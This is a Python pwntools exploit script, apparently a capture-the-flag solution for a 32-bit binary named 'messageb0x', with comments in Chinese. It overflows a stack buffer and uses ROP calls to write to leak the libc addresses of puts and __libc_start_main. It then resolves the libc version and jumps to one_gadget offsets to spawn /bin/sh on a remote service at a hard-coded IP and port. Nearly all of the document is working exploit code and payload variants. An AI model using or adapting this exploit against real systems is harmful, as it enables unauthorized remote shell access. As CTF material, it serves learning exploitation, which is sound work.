#!/usr/bin/python env
#coding:utf-8
#authro:KimballCho

from pwn import *

#DEBUG = True
#context.log_level = "DEBUG"

elf_file = ELF('./messageb0x')
remote_libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
write_plt = elf_file.symbols['write']
libc_start_main = elf_file.got['__libc_start_main']
puts_got = elf_file.got['puts']
welcome = 0x080493ce
process_info = 0x080493d3
offset_got_libc = remote_libc.get_section_by_name('.got.plt').header['sh_addr']
libc_start_main_real = 0
offset_addr = 0
got_libc_real = 0

#first step：泄漏puts和__libc_start_main地址来确定libc的版本

def leak(write_plt, welcome, address, pro_process):
	payload = 'A' * 92 + p32(write_plt) + p32(welcome) + p32(1) + p32(address) + p32(4)
	pro_process.sendafter('who you are:\n','1\n')
	pro_process.sendafter('your email address:\n','1\n')
	pro_process.sendafter('you want to say:\n',payload + '\n')
	for i in range(4):
		recv_result = pro_process.recvline()
	print hex(address) + '=>  0x' + recv_result[:4][::-1].encode('hex')
	return '0x' + recv_result[:4][::-1].encode('hex')

pro_process = process('./messageb0x')
pro_process = remote('101.71.29.5', 10000)
for i in [puts_got, libc_start_main]:
	libc_start_main_real = leak(write_plt, welcome, i, pro_process)
print 'libc_start_main_real => ' + libc_start_main_real


#通过libc-database查找libc版本
# ～/libc-database# ./find __libc_start_main 540 puts 140
# ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)

offset_addr = eval(libc_start_main_real) - 0x18540
print 'offset addr => ' + hex(offset_addr)

got_libc_real = offset_addr + offset_got_libc
print 'got_libc_real => ' + hex(got_libc_real)

#payload 函数
def shellPwn(payload):
	pro_process.sendafter('who you are:\n','1\n')
	pro_process.sendafter('your email address:\n','1\n')
	pro_process.sendafter('you want to say:\n',payload + '\n')
	pro_process.interactive()

#通过one_gadget查找shell gadget
'''
0x3a80c	execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3a80e	execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3a812	execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3a819	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5f065	execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5f066	execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''

#通过ROPgadget查找需要利用的gadget
'''
对于messageb0x：
0x08049459 : pop esi ; pop edi ; pop ebp ; ret
对于libc6-i386_2.23-0ubuntu10_amd64.so：
'''
pop_3_gadget = 0x08049459

#对于0x3a80c,0x3a80e,0x3a812,0x3a819构造payload：
offset_magic_addr_1 = [0x3a80c,0x3a80e,0x3a812,0x3a819]
#在调用到0x3a812的时候，pwn失败，其他均成功反编译后查看，调用前三个时，都会预先调用sigprocmask函数，猜测可能是因为EIP的位置
#导致这个函数不能成功执行，但是one_gadget并没有检测到
#修改key，使用对应gadget
magic_addr_1 = offset_addr + offset_magic_addr_1[3]
print 'magic_addr_1 => ' + hex(magic_addr_1)

payload1 = p32(0) * 23 + p32(pop_3_gadget) + p32(got_libc_real) + p32(0) + p32(0) + p32(magic_addr_1)
#shellPwn(payload1)


#对于0x5f065, 0x5f066构造payload:
#0x5f066的先决条件是[esp] == NULL 较好实现

offset_magic_addr_2 = [0x5f065, 0x5f066]
magic_addr_2 = offset_addr + offset_magic_addr_2[1]
print 'magic_addr_2 => ' + hex(magic_addr_2)
pop_3_gadget = 0x08049459
payload2 = p32(0) * 23 + p32(pop_3_gadget) + p32(got_libc_real) + p32(0) + p32(0) + p32(magic_addr_2)
payload2 += p32(0)
#去除注释，使用此payload
#shellPwn(payload2)


#对于0x5f065,需要再寻找一个新的gadget，满足esi = got_libc_real，eax = NULL
#libc中gadget：
#0x0002ba54 : xor eax, eax ; pop ebx ; pop esi ; ret
#0x0009f1e4 : xor eax, eax ; pop edi ; pop esi ; ret
#0x0001afd3 : xor eax, eax ; pop esi ; pop edi ; ret
#0x0002c5fc : xor eax, eax ; ret
offset_xor_gadget = 0x2c5fc
libc_xor_gadget = offset_addr + offset_xor_gadget
print 'libc_xor_gadget => ' + hex(libc_xor_gadget)

magic_addr_2_0 = offset_addr + offset_magic_addr_2[0]
print 'magic_addr_2_0 => ' + hex(magic_addr_2_0)
payload2_0 = p32(0) * 23 + p32(pop_3_gadget) + p32(got_libc_real) + p32(0) + p32(0)
payload2_0 += p32(libc_xor_gadget) + p32(magic_addr_2_0)
#去除注释，使用此payload
#shellPwn(payload2_0)

#或者
offset_xor_pop_gadget = 0x1afd3
libc_xor_pop_gadget = offset_addr + offset_xor_pop_gadget
payload2_0 = p32(0) * 23 + p32(libc_xor_pop_gadget) + p32(got_libc_real) + p32(0) + p32(magic_addr_2_0)
shellPwn(payload2_0)
